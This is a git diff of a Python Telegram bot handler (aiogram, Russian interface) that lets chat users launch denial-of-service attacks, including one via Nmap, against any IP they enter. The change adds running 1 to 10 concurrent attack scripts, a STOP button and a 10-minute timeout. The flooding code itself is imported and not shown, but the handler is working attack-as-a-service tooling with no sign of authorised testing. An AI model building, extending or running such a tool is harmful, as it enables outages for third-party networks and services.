@@ -5,11 +5,12 @@ from aiogram.dispatcher import FSMContext
 from aiogram.dispatcher.filters import Text
 
 from keyboards.default import start_markup, back_menu_markup
-from keyboards.default.scripts.dos import choose_dos_markup
+from keyboards.default.scripts.dos import choose_dos_markup, stop_script_markup
 from loader import dp
 from states import DosState
 from utils.misc import rate_limit
 from utils.scripts.dos import start_dos, start_nmap, get_ping
+from utils.scripts.dos.start_dos import get_timeout
 
 
 @rate_limit(0.5)
@@ -22,7 +23,7 @@ async def dos_menu(message: types.Message):
 
 @rate_limit(0.5)
 @dp.message_handler(state=DosState.dos)
-async def enter_ip(message: types.Message, state: FSMContext):
+async def enter_dos(message: types.Message, state: FSMContext):
     if message.text == 'В главное меню':
         await state.reset_state()
         await message.answer("Вы отменили ввод данных. Возврат в главное меню.\n"
@@ -30,10 +31,37 @@ async def enter_ip(message: types.Message, state: FSMContext):
     elif message.text in ['DoS', 'DoS через Nmap']:
         async with state.proxy() as state_data:
             state_data['dos'] = message.text
-        await message.answer("Введите ip.", reply_markup=back_menu_markup)
-        await DosState.ip.set()
+        # тут, где 10, потом добавить параметр для различных ролей пользователей: например сравнивать роли через БД
+        await message.answer("Введите количество одновременно работающих скриптов.\n"
+                             "Для вас доступен диапазон от 1 до 10", reply_markup=back_menu_markup)
+        await DosState.count_script.set()
     else:
         await message.answer("Неверный ввод. Попробуйте ещё раз.")
+
+
+@rate_limit(0.5)
+@dp.message_handler(state=DosState.count_script)
+async def enter_dos(message: types.Message, state: FSMContext):
+    if message.text == 'Назад':
+        async with state.proxy() as state_data:
+            state_data.pop('dos')
+        await message.answer("Вы вернулись назад.\nВыберите способ атаки.", reply_markup=choose_dos_markup)
+        await DosState.dos.set()
+    elif message.text == 'В главное меню':
+        await state.reset_state()
+        await message.answer("Вы отменили ввод данных. Возврат в главное меню.\n"
+                             "Выберите эксплойт.", reply_markup=start_markup)
+    elif message.text.isnumeric():
+        # тут, где 10, потом добавить параметр для различных ролей пользователей: например сравнивать роли через БД
+        if int(message.text) in range(1, 10):
+            async with state.proxy() as state_data:
+                state_data['count_script'] = message.text
+            await message.answer("Введите ip.")
+            await DosState.ip.set()
+        else:
+            await message.answer("Неверное число. Попробуйте ещё раз.")
+    else:
+        await message.answer("Вы ввели не число. Попробуйте ещё раз.")
 
 
 @rate_limit(0.5)
@@ -41,7 +69,7 @@ async def enter_ip(message: types.Message, state: FSMContext):
 async def enter_ip(message: types.Message, state: FSMContext):
     if message.text == 'Назад':
         async with state.proxy() as state_data:
-            state_data.pop('dos')
+            state_data.pop('count_script')
         await message.answer("Вы вернулись назад.\nВыберите способ атаки.", reply_markup=choose_dos_markup)
         await DosState.dos.set()
     elif message.text == 'В главное меню':
@@ -111,16 +139,34 @@ async def enter_size(message: types.Message, state: FSMContext):
         await message.answer("Вы отменили ввод данных. Возврат в главное меню.\n"
                              "Выберите эксплойт.", reply_markup=start_markup)
     elif message.text.isnumeric():
+        await state.update_data(size=message.text)
         async with state.proxy() as state_data:
-            state_data['size'] = message.text
-            await message.answer("Скрипт выполняется...")
-            task1 = asyncio.create_task(get_ping(message, state_data))
-            task2 = asyncio.create_task(start_dos(state_data))
-            finished, unfinished = await asyncio.wait([task1, task2], return_when=asyncio.FIRST_COMPLETED)
+            await DosState.stop_script.set()
+            await message.answer("Скрипт выполняется. Для остановки нажмите на кнопку STOP.\n"
+                                 "Так же был определён таймаут в 10 минут, чтобы не было большого количества запросов.",
+                                 reply_markup=stop_script_markup)
+            task_get_ping = asyncio.create_task(get_ping(message, state_data))
+            task_get_timeout = asyncio.create_task(get_timeout())
+            tasks = [task_get_ping, task_get_timeout]
+            for i in range(int(state_data['count_script'])):
+                tasks.append(asyncio.create_task(start_dos(state_data)))
+            finished, unfinished = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
             for task in unfinished:
                 task.cancel()
+        if await dp.current_state().get_state() == 'DosState:size':
             await message.answer("Скрипт успешно выполнен. Возврат в главное меню.\n"
                                  "Выберите эксплойт.", reply_markup=start_markup)
-        await state.reset_state()
+            await state.reset_state()
     else:
         await message.answer("Вы ввели не числовое значение. Попробуйте ещё раз.")
+
+
+@rate_limit(0.5)
+@dp.message_handler(Text(equals=["STOP"]), state=DosState.stop_script)
+async def stop_dos_script(message: types.Message, state: FSMContext):
+    await DosState.stopped_script.set()
+    await message.answer("Скрипт останавливается, пожалуйста подождите.")
+    await asyncio.sleep(6)
+    await state.reset_state()
+    await message.answer("Скрипт был остановлен. Возврат в главное меню.\n"
+                         "Выберите эксплойт.", reply_markup=start_markup)
